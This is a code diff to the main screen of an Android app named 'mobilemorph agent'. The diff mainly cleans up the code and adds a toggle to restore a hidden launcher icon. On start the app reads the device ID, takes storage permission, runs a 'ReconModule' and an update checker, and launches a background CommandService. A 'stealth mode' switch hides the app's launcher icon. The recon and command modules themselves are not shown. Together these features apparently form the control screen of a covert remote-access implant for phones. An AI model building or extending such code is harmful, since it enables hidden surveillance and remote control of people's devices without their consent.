@@ -1,4 +1,5 @@
 package com.mobilemorph.agent;
+
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
@@ -13,15 +14,18 @@ import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.widget.Button;
+
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import android.provider.Settings;
+
 import com.mobilemorph.agent.ReconModule;
 import com.mobilemorph.agent.services.CommandService;
 import com.mobilemorph.agent.UpdateChecker;
 
 public class MainActivity extends Activity {
     private static final int REQUEST_PERMISSIONS = 100;
+    private static final String TAG = "MainActivity";
     private SharedPreferences prefs;
     private Button startAgentButton;
 
@@ -32,12 +36,12 @@ public class MainActivity extends Activity {
 
         prefs = getSharedPreferences("agent", MODE_PRIVATE);
 
-        // Display device ID
+        // Show Android ID (Device ID)
         TextView deviceIdText = findViewById(R.id.deviceIdText);
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         deviceIdText.setText("Device ID: " + deviceId);
 
-        // Setup "Start Agent" button
+        // Setup Start Agent Button
         startAgentButton = findViewById(R.id.startAgentButton);
         startAgentButton.setOnClickListener(v -> {
             if (!hasStoragePermissions()) {
@@ -48,35 +52,38 @@ public class MainActivity extends Activity {
             Toast.makeText(MainActivity.this, "Agent Started", Toast.LENGTH_SHORT).show();
         });
 
-        // Disable the button until permission is granted
+        // Enable button only if permissions granted
         startAgentButton.setEnabled(hasStoragePermissions());
 
-        // Toggle for stealth mode
+        // Stealth mode toggle
         Switch serverToggle = findViewById(R.id.serverToggle);
         boolean stealth = prefs.getBoolean("stealth_mode", false);
         serverToggle.setChecked(stealth);
-        // On toggle click, update stealth mode setting
         serverToggle.setOnCheckedChangeListener((buttonView, isChecked) -> {
             prefs.edit().putBoolean("stealth_mode", isChecked).apply();
             if (isChecked) {
                 hideLauncherIcon();
-                finish();  // Optional: auto-close after enabling stealth
+                Toast.makeText(this, "Stealth mode activated", Toast.LENGTH_SHORT).show();
+            } else {
+                showLauncherIcon();
+                Toast.makeText(this, "Stealth mode disabled", Toast.LENGTH_SHORT).show();
             }
         });
 
-        requestRuntimePermissions();  // Will start CommandService if granted
+        requestRuntimePermissions(); // Will auto-start service if permission is granted
     }
 
     private boolean hasStoragePermissions() {
-        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+                == PackageManager.PERMISSION_GRANTED;
     }
 
     private void requestRuntimePermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasStoragePermissions()) {
             ActivityCompat.requestPermissions(this,
-                new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                REQUEST_PERMISSIONS);
-        } else {        
+                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
+                    REQUEST_PERMISSIONS);
+        } else {
             startAgentService();
             startAgentButton.setEnabled(true);
         }
@@ -85,16 +92,22 @@ public class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+        if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0 &&
+                grantResults[0] == PackageManager.PERMISSION_GRANTED) {
             startAgentService();
             startAgentButton.setEnabled(true);
+        } else {
+            Log.w(TAG, "Permission denied, agent not started.");
         }
     }
 
     private void startAgentService() {
-        // Start core agent behavior
+        Log.d(TAG, "Starting agent service...");
+
+        // Run optional recon/update logic
         ReconModule.runRecon(this);
         UpdateChecker.checkForUpdate(this);
+
         Intent serviceIntent = new Intent(this, CommandService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
@@ -104,15 +117,20 @@ public class MainActivity extends Activity {
     }
 
     private void hideLauncherIcon() {
-        new Handler().postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                PackageManager p = getPackageManager();
-                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
-                p.setComponentEnabledSetting(componentName,
-                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                        PackageManager.DONT_KILL_APP);
-            }
-        }, 1000); // delay optional
+        new Handler().postDelayed(() -> {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            pm.setComponentEnabledSetting(componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        }, 1000);
+    }
+
+    private void showLauncherIcon() {
+        PackageManager pm = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        pm.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP);
     }
 }
